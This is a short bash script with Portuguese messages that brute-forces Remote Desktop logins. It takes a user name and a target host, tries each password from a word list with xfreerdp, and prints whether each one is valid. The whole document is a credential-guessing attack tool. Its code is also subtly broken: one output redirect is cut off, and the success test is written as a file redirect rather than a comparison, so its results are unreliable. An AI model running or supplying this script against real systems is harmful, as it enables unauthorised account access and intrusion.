#!/bin/bash
if [ -z "$1" ] || [ -z "$2" ] ; then
	echo "Informe os valores: \n$0 <USER> <ALVO> "
	exit
fi
for pass in `cat lista.txt`
do
echo $pass
xfreerdp /u:$1 /v:$2 /p:$pass  2> /dev/null 1>$
 if [ $? > 0 ] ;then
	 echo "[-] Senha $pass - INVALIDA"
 else
	 echo "[+] Senha $pass - VALIDA"
 fi
done
